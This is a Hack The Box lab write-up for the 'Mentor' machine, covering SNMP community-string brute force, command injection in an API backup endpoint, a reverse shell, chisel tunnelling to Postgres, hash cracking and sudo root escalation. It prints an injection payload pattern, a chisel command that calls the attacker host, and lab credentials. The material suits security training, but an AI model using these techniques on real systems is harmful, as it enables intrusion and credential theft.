---
title: "[HTB] Machine: Mentor"
description: "[HTB] Machine: Mentor"
date: 2023-11-13
menu:
  sidebar:
    name: "[HTB] Machine: Mentor"
    identifier: htb-machine-Mentor
    parent: htb-machines-linux
    weight: 10
hero: images/mentor.png
tags: ["HTB", "snmp", "fastapi", "flask", "snmp-brute", "onesixtyone", "snmpwalk", "snmpbulkwalk", "command-injection", "postgresql", "chisel", "psql", "crackstation"]
---

# Mentor
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.11.193 --min-rate 1000            
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-12 19:28 GMT
Nmap scan report for 10.10.11.193 (10.10.11.193)
Host is up (0.19s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
20965/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 83.77 seconds

```
```
└─$ nmap -Pn -p22,80 -sC -sV 10.10.11.193 --min-rate 1000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-12 19:32 GMT
Nmap scan report for 10.10.11.193 (10.10.11.193)
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://mentorquotes.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.96 seconds
                                                                                         
```
```
└─$ sudo nmap -Pn -F -sU 10.10.11.193 --min-rate 1000
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-12 19:33 GMT
Nmap scan report for 10.10.11.193 (10.10.11.193)
Host is up (0.28s latency).
Not shown: 94 open|filtered udp ports (no-response)
PORT     STATE  SERVICE
161/udp  open   snmp
1813/udp closed radacct
2049/udp closed nfs
2222/udp closed msantipiracy
2223/udp closed rockwell-csp2
5000/udp closed upnp

Nmap done: 1 IP address (1 host up) scanned in 1.94 seconds

```
- Web Server

![](./images/1.png)

- `feroxbuster`

```
└─$ feroxbuster -u http://mentorquotes.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -t 50   

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://mentorquotes.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      167l      621w     5506c http://mentorquotes.htb/
403      GET        9l       28w      281c http://mentorquotes.htb/server-status

```
- `vhosts`
```
└─$ wfuzz -u http://mentorquotes.htb -H 'Host: FUZZ.mentorquotes.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 26
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://mentorquotes.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000051:   404        0 L      2 W        22 Ch       "api"   
```

- `api.mentorquotes.htb`

![](./images/2.png)

- `feroxbuster` for `api.mentorquotes.htb`
```

```

- `snmpwalk`
```
└─$ snmpwalk -v 2c -c public 10.10.11.193          
SNMPv2-MIB::sysDescr.0 = STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (124001) 0:20:40.01
SNMPv2-MIB::sysContact.0 = STRING: Me <admin@mentorquotes.htb>
SNMPv2-MIB::sysName.0 = STRING: mentor
SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (1) 0:00:00.01
HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (126669) 0:21:06.69
HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2023-11-12,19:39:20.0,+0:0
HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216
HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 232
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = No more variables left in this MIB View (It is past the end of the MIB tree)

```

## Foothold
- Let's enumerate `api`
```
└─$ feroxbuster -u http://api.mentorquotes.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -t 50 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://api.mentorquotes.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
307      GET        0l        0w        0c http://api.mentorquotes.htb/admin => http://api.mentorquotes.htb/admin/
307      GET        0l        0w        0c http://api.mentorquotes.htb/docs/ => http://api.mentorquotes.htb/docs
200      GET       69l      212w     2637c http://api.mentorquotes.htb/docs/oauth2-redirect
200      GET        1l       48w     7676c http://api.mentorquotes.htb/openapi.json
200      GET       31l       62w      969c http://api.mentorquotes.htb/docs
307      GET        0l        0w        0c http://api.mentorquotes.htb/users => http://api.mentorquotes.htb/users/
405      GET        1l        3w       31c http://api.mentorquotes.htb/admin/backup

```

![](./images/3.png)

- Nothing interesting in `api`
  - I had to return to `snmp` due to hints from forum
  - I used [snmpbrute](https://github.com/SECFORCE/SNMP-Brute) since it supports both `v1` and `v2`
```
└─$ python snmpbrute.py -t 10.10.11.193
   _____ _   ____  _______     ____             __     
  / ___// | / /  |/  / __ \   / __ )_______  __/ /____ 
  \__ \/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \
 ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/
/____/_/ |_/_/  /_/_/      /_____/_/   \__,_/\__/\___/ 

SNMP Bruteforce & Enumeration Script v2.0
http://www.secforce.com / nikos.vassakis <at> secforce.com
###############################################################

Trying ['', '0', '0392a0', '1234', '2read', '3com', '3Com', '3COM', '4changes', 'access', 'adm', 'admin', 'Admin', 'administrator', 'agent', 'agent_steal', 'all', 'all private', 'all public', 'anycom', 'ANYCOM', 'apc', 'bintec', 'blue', 'boss', 'c', 'C0de', 'cable-d', 'cable_docsispublic@es0', 'cacti', 'canon_admin', 'cascade', 'cc', 'changeme', 'cisco', 'CISCO', 'cmaker', 'comcomcom', 'community', 'core', 'CR52401', 'crest', 'debug', 'default', 'demo', 'dilbert', 'enable', 'entry', 'field', 'field-service', 'freekevin', 'friend', 'fubar', 'guest', 'hello', 'hideit', 'host', 'hp_admin', 'ibm', 'IBM', 'ilmi', 'ILMI', 'intel', 'Intel', 'intermec', 'Intermec', 'internal', 'internet', 'ios', 'isdn', 'l2', 'l3', 'lan', 'liteon', 'login', 'logon', 'lucenttech', 'lucenttech1', 'lucenttech2', 'manager', 'master', 'microsoft', 'mngr', 'mngt', 'monitor', 'mrtg', 'nagios', 'net', 'netman', 'network', 'nobody', 'NoGaH$@!', 'none', 'notsopublic', 'nt', 'ntopia', 'openview', 'operator', 'OrigEquipMfr', 'ourCommStr', 'pass', 'passcode', 'password', 'PASSWORD', 'pr1v4t3', 'pr1vat3', 'private', ' private', 'private ', 'Private', 'PRIVATE', 'private@es0', 'Private@es0', 'private@es1', 'Private@es1', 'proxy', 'publ1c', 'public', ' public', 'public ', 'Public', 'PUBLIC', 'public@es0', 'public@es1', 'public/RO', 'read', 'read-only', 'readwrite', 'read-write', 'red', 'regional', '<removed>', 'rmon', 'rmon_admin', 'ro', 'root', 'router', 'rw', 'rwa', 'sanfran', 'san-fran', 'scotty', 'secret', 'Secret', 'SECRET', 'Secret C0de', 'security', 'Security', 'SECURITY', 'seri', 'server', 'snmp', 'SNMP', 'snmpd', 'snmptrap', 'snmp-Trap', 'SNMP_trap', 'SNMPv1/v2c', 'SNMPv2c', 'solaris', 'solarwinds', 'sun', 'SUN', 'superuser', 'supervisor', 'support', 'switch', 'Switch', 'SWITCH', 'sysadm', 'sysop', 'Sysop', 'system', 'System', 'SYSTEM', 'tech', 'telnet', 'TENmanUFactOryPOWER', 'test', 'TEST', 'test2', 'tiv0li', 'tivoli', 'topsecret', 'traffic', 'trap', 'user', 'vterm1', 'watch', 'watchit', 'windows', 'windowsnt', 'workstation', 'world', 'write', 'writeit', 'xyzzy', 'yellow', 'ILMI'] community strings ...
10.10.11.193 : 161      Version (v2c):  internal
10.10.11.193 : 161      Version (v1):   public
10.10.11.193 : 161      Version (v2c):  public

10.10.11.193 : 161      Version (v1):   public
10.10.11.193 : 161      Version (v2c):  public

```

- I've already ran `snmpwalk` with `public`
  - Let's run it using `internal` community string
  - I'll run `snmpbulkwalk` which is faster
  - If we check `HOST-RESOURCES-MIB::hrSWRunParameters` we find a process with `login.py` and possibly a password

![](./images/4.png)

- There was a `james`' email which I tried using with password I found in `SNMP` and it returned a `token`

![](./images/5.png)

- Token contains only `username` and `email`

![](./images/6.png)

- But with this token we can request other endpoints

![](./images/7.png)

- We saw `admin` endpoint during enumeration
  - I tried checking if I have admin privileges
  - But it looks like it's not implemented yet

![](./images/8.png)

- It also has `/admin/backup` 
  - It works with `POST` request 
  - But still returns error

![](./images/9.png)

- It needs `Content-Type: application/json`
  - And body `{}` with `path` field

![](./images/10.png)

- We can try injecting commands (`ping` for example)
  - The payload that worked: `;<CMD>;`

![](./images/11.png)

- Bash reverse shells didn't work
  - The python one worked, since we saw that it was isntalled in `snmp` results
  - I received the connection but it was breaking right away
    - Changing to `sh` instead of `bash` worked

![](./images/12.png)

## User
- We know it's a `docker` application
```
/ # ls -lha
total 172K   
drwxr-xr-x    1 root     root        4.0K Nov 14 17:56 .
drwxr-xr-x    1 root     root        4.0K Nov 14 17:56 ..
-rwxr-xr-x    1 root     root           0 Nov 14 17:56 .dockerenv
drwxr-xr-x    3 root     root        4.0K Dec 11  2022 API
drwxr-xr-x    1 root     root        4.0K Nov 10  2022 app
-rw-r--r--    1 root     root       99.5K Nov 15 15:00 app_backkup.tar
drwxr-xr-x    1 root     root        4.0K Jun  8  2022 bin
drwxr-xr-x    5 root     root         340 Nov 14 17:56 dev
drwxr-xr-x    1 root     root        4.0K Nov 14 17:56 etc
drwxr-xr-x    1 root     root        4.0K Nov 10  2022 home
drwxr-xr-x    1 root     root        4.0K Jun  8  2022 lib
drwxr-xr-x    5 root     root        4.0K Nov 10  2022 media
drwxr-xr-x    2 root     root        4.0K Nov 10  2022 mnt
drwxr-xr-x    2 root     root        4.0K Nov 10  2022 opt
dr-xr-xr-x  301 root     root           0 Nov 14 17:56 proc
drwx------    2 root     root        4.0K Nov 10  2022 root
drwxr-xr-x    2 root     root        4.0K Nov 10  2022 run
drwxr-xr-x    2 root     root        4.0K Nov 10  2022 sbin
drwxr-xr-x    2 root     root        4.0K Nov 10  2022 srv
dr-xr-xr-x   13 root     root           0 Nov 14 17:56 sys
drwxrwxrwt    1 root     root        4.0K Nov 14 17:56 tmp
drwxr-xr-x    1 root     root        4.0K Nov 10  2022 usr
drwxr-xr-x    1 root     root        4.0K Nov 10  2022 var

```

- `app` and `API` folder contain `Dockerfiles`
```
/ # cat app/Dockerfile 
FROM python:3.6.9-alpine

RUN apk --update --upgrade add --no-cache  gcc musl-dev jpeg-dev zlib-dev libffi-dev cairo-dev pango-dev gdk-pixbuf-dev

WORKDIR /app
ENV HOME /home/svc
ENV PATH /home/svc/.local/bin:${PATH}
RUN python -m pip install --upgrade pip --user svc
COPY requirements.txt requirements.txt
RUN pip install -r requirements.txt
RUN pip install pydantic[email] pyjwt
EXPOSE 8000
COPY . .
CMD ["python3", "-m", "uvicorn", "app.main:app", "--reload", "--workers", "100", "--host", "0.0.0.0", "--port" ,"8000"]
/ # cat API/Dockerfile 
FROM python:3.6.9-alpine

RUN apk --update --upgrade add --no-cache  gcc musl-dev jpeg-dev zlib-dev libffi-dev cairo-dev pango-dev gdk-pixbuf-dev

WORKDIR /app
ENV HOME /home/svc
ENV PATH /home/svc/.local/bin:${PATH}
RUN python -m pip install --upgrade pip --user svc
COPY requirements.txt requirements.txt
RUN pip install -r requirements.txt
RUN pip install pydantic[email] pyjwt
EXPOSE 8000
COPY . .
CMD ["python3", "-m", "uvicorn", "app.main:app", "--reload", "--workers", "1", "--host", "0.0.0.0", "--port" ,"8000"]
/ # 

```

- Both have `--reload` flag, thus the applications check for changes in source files
  - Inside we see `db.py` which connect to `db` which is probably located in the host since it's ip is different
```
/app/app # cat db.py 
import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

# SQLAlchemy for quotes
engine = create_engine(DATABASE_URL)
metadata = MetaData()
quotes = Table(
    "quotes",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("title", String(50)),
    Column("description", String(50)),
    Column("created_date", DateTime, default=func.now(), nullable=False)
)
<SNIP>
```

- We can upload `chisel` and configure port forwarding
  - Or we can change the source code `/app/app/api/models.py` to include `password` which will be updated live due to `--reload` flag 
```
└─$ ./chisel server -p 9001 --reverse
```
```
/tmp # ./chisel client 10.10.16.4:9001 R:5432:172.22.0.1:5432
```

- Now we can connect to `postgres` and enumerate it
```
└─$ psql -h 127.0.0.1 -U postgres                               
Password for user postgres: 
psql (16.0 (Debian 16.0-2), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.

postgres=# \list
                                                         List of databases
      Name       |  Owner   | Encoding | Locale Provider |  Collate   |   Ctype    | ICU Locale | ICU Rules |   Access privileges   
-----------------+----------+----------+-----------------+------------+------------+------------+-----------+-----------------------
 mentorquotes_db | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | 
 postgres        | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | 
 template0       | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | =c/postgres          +
                 |          |          |                 |            |            |            |           | postgres=CTc/postgres
 template1       | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | =c/postgres          +
                 |          |          |                 |            |            |            |           | postgres=CTc/postgres
(4 rows)

postgres=# \c mentorquotes_db
psql (16.0 (Debian 16.0-2), server 13.7 (Debian 13.7-1.pgdg110+1))
You are now connected to database "mentorquotes_db" as user "postgres".
mentorquotes_db=# \dt
          List of relations
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | cmd_exec | table | postgres
 public | quotes   | table | postgres
 public | users    | table | postgres
(3 rows)

mentorquotes_db=# select * from users;
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
(2 rows)
```

- `svc`'s hash can be cracked in https://crackstation.net/
  - `53f22d0dfa10dce7e29cd31f4f953fd8:123meunomeeivani`
  - We can now `ssh` as `svc`
```
└─$ sshpass -p '123meunomeeivani' ssh svc@10.10.11.193 
Warning: Permanently added '10.10.11.193' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

<SNIP>

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40
svc@mentor:~$ 

```

## Root
- `linpeas` shows a password in `/etc/snmp/snmpd.conf`
```
<SNIP>
╔══════════╣ Analyzing SNMP Files (limit 70)
-rw-r--r-- 1 root root 3453 Jun  5  2022 /etc/snmp/snmpd.conf                                                                                                                                                                               
# rocommunity: a SNMPv1/SNMPv2c read-only access community name
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly
createUser bootstrap MD5 SuperSecurePassword123__ DES
-rw------- 1 Debian-snmp Debian-snmp 1268 Nov 14 17:55 /var/lib/snmp/snmpd.conf
<SNIP>
```
  
- We can `su` to `james`
```
svc@mentor:/tmp$ su - james
Password: 
james@mentor:~$
```

- And he has `sudo` rights
```
james@mentor:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
james@mentor:~$ sudo sh
# whoami
root

```